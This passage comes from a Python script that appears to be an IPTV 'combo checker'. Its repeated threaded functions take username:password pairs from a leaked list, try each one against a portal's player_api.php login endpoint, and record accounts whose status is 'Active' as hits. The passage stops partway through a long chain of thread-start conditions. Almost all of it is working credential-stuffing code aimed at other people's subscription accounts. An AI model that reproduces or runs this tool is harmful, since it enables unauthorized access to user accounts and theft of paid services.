                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_90'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d91():
    global hit
    say = 0
    for fyz in range(91, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_91'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d92():
    global hit
    say = 0
    for fyz in range(92, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_92'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d93():
    global hit
    say = 0
    for fyz in range(93, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = '𝕎𝕒𝕝𝕝𝕚??𝕠𝕥𝕤_93'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d94():
    global hit
    say = 0
    for fyz in range(94, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_94'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d95():
    global hit
    say = 0
    for fyz in range(95, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_95'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d96():
    global hit
    say = 0
    for fyz in range(96, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_96'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d97():
    global hit
    say = 0
    for fyz in range(97, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_97'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d98():
    global hit
    say = 0
    for fyz in range(98, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_98'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d99():
    global hit
    say = 0
    for fyz in range(99, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_99'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:
                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


def d100():
    global hit
    say = 0
    for fyz in range(100, uz, botsay):
        up = re.search(pattern, totLen[fyz], re.IGNORECASE)
        if up:
            fyzz = totLen[fyz].split(":")
            try:
                user = str(fyzz[0].replace(" ", ""))
            except:
                userr = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            try:
                pas = str(fyzz[1].replace(" ", ""))
                pas = str(pas.replace('\n', ""))
            except:
                pas = '𝔼𝕝𝕪𝕥𝕚𝕤𝕥𝕒'
            say = int(say) + 1
            bot = 'BOTS_100'
            oran = ""
            oran = round((fyz / uz * 100), 2)
            echox(user, pas, bot, fyz, oran, hit)

            link = "http://" + portal + "/player_api.php?username=" + user + "&password=" + pas + "&type=m3u"
            bag1 = 0
            data = ""
            while True:
                try:
                    res = ses.get(link, headers=HEADERd, timeout=15, verify=False)
                    break
                except:
                    bag1 = bag1 + 1
                    time.sleep(2)
                    if bag1 == 100:
                        quit()
            data = str(res.text)
            if 'username' in data:

                status = data.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")
                if status == 'Active':
                    print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
                    hit = hit + 1
                    onay(data, user, pas)


t1 = threading.Thread(target=d1)
t2 = threading.Thread(target=d2)
t3 = threading.Thread(target=d3)
t4 = threading.Thread(target=d4)
t5 = threading.Thread(target=d5)
t6 = threading.Thread(target=d6)
t7 = threading.Thread(target=d7)
t8 = threading.Thread(target=d8)
t9 = threading.Thread(target=d9)
t10 = threading.Thread(target=d10)
t11 = threading.Thread(target=d11)
t12 = threading.Thread(target=d12)
t13 = threading.Thread(target=d13)
t14 = threading.Thread(target=d14)
t15 = threading.Thread(target=d15)
t16 = threading.Thread(target=d16)
t17 = threading.Thread(target=d17)
t18 = threading.Thread(target=d18)
t19 = threading.Thread(target=d19)
t20 = threading.Thread(target=d20)
t21 = threading.Thread(target=d21)
t22 = threading.Thread(target=d22)
t23 = threading.Thread(target=d23)
t24 = threading.Thread(target=d24)
t25 = threading.Thread(target=d25)
t26 = threading.Thread(target=d26)
t27 = threading.Thread(target=d27)
t28 = threading.Thread(target=d28)
t29 = threading.Thread(target=d29)
t30 = threading.Thread(target=d30)
t31 = threading.Thread(target=d31)
t32 = threading.Thread(target=d32)
t33 = threading.Thread(target=d33)
t34 = threading.Thread(target=d34)
t35 = threading.Thread(target=d35)
t36 = threading.Thread(target=d36)
t37 = threading.Thread(target=d37)
t38 = threading.Thread(target=d38)
t39 = threading.Thread(target=d39)
t40 = threading.Thread(target=d40)
t41 = threading.Thread(target=d41)
t42 = threading.Thread(target=d42)
t43 = threading.Thread(target=d43)
t44 = threading.Thread(target=d44)
t45 = threading.Thread(target=d45)
t46 = threading.Thread(target=d46)
t47 = threading.Thread(target=d47)
t48 = threading.Thread(target=d48)
t49 = threading.Thread(target=d49)
t50 = threading.Thread(target=d50)
t51 = threading.Thread(target=d51)
t52 = threading.Thread(target=d52)
t53 = threading.Thread(target=d53)
t54 = threading.Thread(target=d54)
t55 = threading.Thread(target=d55)
t56 = threading.Thread(target=d56)
t57 = threading.Thread(target=d57)
t58 = threading.Thread(target=d58)
t59 = threading.Thread(target=d59)
t60 = threading.Thread(target=d60)
t61 = threading.Thread(target=d61)
t62 = threading.Thread(target=d62)
t63 = threading.Thread(target=d63)
t64 = threading.Thread(target=d64)
t65 = threading.Thread(target=d65)
t66 = threading.Thread(target=d66)
t67 = threading.Thread(target=d67)
t68 = threading.Thread(target=d68)
t69 = threading.Thread(target=d69)
t70 = threading.Thread(target=d70)
t71 = threading.Thread(target=d71)
t72 = threading.Thread(target=d72)
t73 = threading.Thread(target=d73)
t74 = threading.Thread(target=d74)
t75 = threading.Thread(target=d75)
t76 = threading.Thread(target=d76)
t77 = threading.Thread(target=d77)
t78 = threading.Thread(target=d78)
t79 = threading.Thread(target=d79)
t80 = threading.Thread(target=d80)
t81 = threading.Thread(target=d81)
t82 = threading.Thread(target=d82)
t83 = threading.Thread(target=d83)
t84 = threading.Thread(target=d84)
t85 = threading.Thread(target=d85)
t86 = threading.Thread(target=d86)
t87 = threading.Thread(target=d87)
t88 = threading.Thread(target=d88)
t89 = threading.Thread(target=d89)
t90 = threading.Thread(target=d90)
t91 = threading.Thread(target=d91)
t92 = threading.Thread(target=d92)
t93 = threading.Thread(target=d93)
t94 = threading.Thread(target=d94)
t95 = threading.Thread(target=d95)
t96 = threading.Thread(target=d96)
t97 = threading.Thread(target=d97)
t98 = threading.Thread(target=d98)
t99 = threading.Thread(target=d99)
t100 = threading.Thread(target=d100)
t1.start()

if botsay == 2 or botsay == 3 or botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t2.start()
if botsay == 3 or botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t3.start()
if botsay == 4 or botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t4.start()
if botsay == 5 or botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t5.start()
if botsay == 6 or botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t6.start()
if botsay == 7 or botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t7.start()
if botsay == 8 or botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t8.start()
if botsay == 9 or botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or botsay == 94 or botsay == 95 or botsay == 96 or botsay == 97 or botsay == 98 or botsay == 99 or botsay == 100:
    t9.start()
if botsay == 10 or botsay == 11 or botsay == 12 or botsay == 13 or botsay == 14 or botsay == 15 or botsay == 16 or botsay == 17 or botsay == 18 or botsay == 19 or botsay == 20 or botsay == 21 or botsay == 22 or botsay == 23 or botsay == 24 or botsay == 25 or botsay == 26 or botsay == 27 or botsay == 28 or botsay == 29 or botsay == 30 or botsay == 31 or botsay == 32 or botsay == 33 or botsay == 34 or botsay == 35 or botsay == 36 or botsay == 37 or botsay == 38 or botsay == 39 or botsay == 40 or botsay == 41 or botsay == 42 or botsay == 43 or botsay == 44 or botsay == 45 or botsay == 46 or botsay == 47 or botsay == 48 or botsay == 49 or botsay == 50 or botsay == 51 or botsay == 52 or botsay == 53 or botsay == 54 or botsay == 55 or botsay == 56 or botsay == 57 or botsay == 58 or botsay == 59 or botsay == 60 or botsay == 61 or botsay == 62 or botsay == 63 or botsay == 64 or botsay == 65 or botsay == 66 or botsay == 67 or botsay == 68 or botsay == 69 or botsay == 70 or botsay == 71 or botsay == 72 or botsay == 73 or botsay == 74 or botsay == 75 or botsay == 76 or botsay == 77 or botsay == 78 or botsay == 79 or botsay == 80 or botsay == 81 or botsay == 82 or botsay == 83 or botsay == 84 or botsay == 85 or botsay == 86 or botsay == 87 or botsay == 88 or botsay == 89 or botsay == 90 or botsay == 91 or botsay == 92 or botsay == 93 or 